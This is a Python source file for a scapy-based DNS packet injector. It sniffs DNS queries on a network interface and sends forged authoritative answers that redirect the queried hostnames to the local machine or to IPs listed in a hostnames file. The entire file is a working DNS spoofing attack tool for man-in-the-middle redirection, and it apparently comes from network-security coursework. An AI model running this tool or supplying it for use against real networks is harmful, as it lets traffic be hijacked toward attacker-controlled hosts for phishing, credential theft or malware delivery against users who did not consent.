import argparse
import socket
from scapy.all import *

hf_flag = 0
hf_d = {}
local_ip = "127.0.0.1"


def arg_parser():
    # Required Options
    parser = argparse.ArgumentParser(prog='dns_packet_injector.py',
                                     description="Please specify the interface to capture ,host_names ",
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter, add_help=False)
    parser.add_argument('-i', '--interface', help="interface to capture")
    parser.add_argument('-h', '--host_names', help="hostname to capture")
    parser.add_argument('bpf_filter', nargs='*', help='bpf filter name')
    parsed_args = parser.parse_args()
    return parsed_args


def print_args(parsed_args):
    if parsed_args.interface is None:
        print "No interface given capturing on all interfaces"
    else:
        print "capturing on {interface}".format(interface=parsed_args.interface)

    if parsed_args.host_names is None:
        print "No host names specified"
    else:
        print "host name is {host_name}".format(host_name=parsed_args.interface)

    if parsed_args.bpf_filter is None:
        print "No bpf filter given"
    else:
        print "BPF filter is {bpf_filter}".format(bpf_filter=parsed_args.bpf_filter)


def executor():
    set_local_ip()
    parsed_args = arg_parser()
    # print_args(parsed_args)
    global hf_flag
    if parsed_args.host_names:
        hf_flag = 1
    if parsed_args.host_names:
        load_file(parsed_args.host_names)

    filter = "udp port 53 and {bpf}".format(bpf=parsed_args.bpf_filter) if parsed_args.bpf_filter else 'udp port 53'
    if parsed_args.interface is not None:
        sniff(filter=filter, iface=parsed_args.interface, store=0, prn=packet_spoofing)
    else:
        sniff(filter=filter, store=0, prn=packet_spoofing)


def load_file(file_path):
    global hf_d
    with open(file_path, "r") as hf:
        for line in hf:
            ip, host_name = [i for i in line.strip().split(" ") if i]
            host_name = host_name + '.'
            hf_d[host_name] = ip


def packet_spoofing(pack):
    if is_valid_packet(pack):
        query_name = pack[DNSQR].qname
        ip_to_redirect = get_ip_to_redirect(query_name)
        if ip_to_redirect:
            sf_pkt = IP(dst=pack[IP].src, src=pack[IP].dst) / \
                     UDP(dport=pack[UDP].sport, sport=pack[UDP].dport) / \
                     DNS(ancount=1, id=pack[DNS].id, qd=pack[DNS].qd, aa=1, qr=1,
                         an=DNSRR(rrname=pack[DNS].qd.qname, rdata=ip_to_redirect, ttl=15))
            send(sf_pkt)
            print "New packet is ", pack.summary()


def sanitize(query_name):
    return query_name.rstrip('.')


def is_valid_packet(pack):
    if pack.haslayer(DNSQR) and pack[DNS].qr == 0 and pack[DNSQR].qtype == 1:
        return True
    return False


def get_ip_to_redirect(query_name):
    if hf_flag:
        if query_name in hf_d:
            return hf_d[query_name]
        else:
            return None
    else:
        return local_ip


def set_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    global local_ip
    local_ip = s.getsockname()[0]


if __name__ == "__main__":
    executor()
    # print load_file("hostnames")
    # print hf_d
    # set_local_ip()
    # print local_ip
    # print arg_parser()
